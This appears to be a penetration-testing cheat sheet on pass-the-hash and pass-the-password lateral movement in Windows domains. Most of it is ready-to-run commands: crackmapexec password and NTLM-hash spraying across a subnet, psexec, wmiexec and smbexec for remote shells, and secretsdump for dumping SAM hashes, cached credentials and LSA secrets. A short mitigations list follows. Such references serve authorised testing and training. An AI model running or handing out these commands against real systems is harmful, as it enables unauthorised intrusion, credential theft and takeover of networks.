# Pass the Hash / Pass the Password

Use captured credentials or NTLM hashes to authenticate to other machines without cracking.

## Pass the Password

```bash
# crackmapexec -- spray a password across the network
crackmapexec smb 172.16.50.0/24 -u username -d DOMAIN.local -p 'password'
```

Successful logins show `(Pwn3d!)` if the user has local admin on the target.

## Pass the Hash

```bash
# crackmapexec with NTLM hash
crackmapexec smb 172.16.50.0/24 -u username -H NTHASH --local-auth
```

**Note:** Only the NT portion of the hash is needed, not the full LM:NT pair.

## Getting a Shell After Success

```bash
# psexec with password
psexec.py DOMAIN/username:'password'@TARGET_IP

# psexec with hash
psexec.py DOMAIN/username@TARGET_IP -hashes LMHASH:NTHASH

# Alternatives if psexec fails
wmiexec.py DOMAIN/username:'password'@TARGET_IP
smbexec.py DOMAIN/username:'password'@TARGET_IP
```

## Dumping Hashes with secretsdump

```bash
# With password
secretsdump.py DOMAIN/username:'password'@TARGET_IP

# With hash
secretsdump.py DOMAIN/username@TARGET_IP -hashes LMHASH:NTHASH
```

Dumps SAM hashes, cached credentials, and LSA secrets.

## Mitigations

- Limit local admin accounts
- Use strong, unique passwords per machine (LAPS)
- Disable WDigest authentication
- Restrict credential caching
- Use Privileged Access Workstations (PAWs)
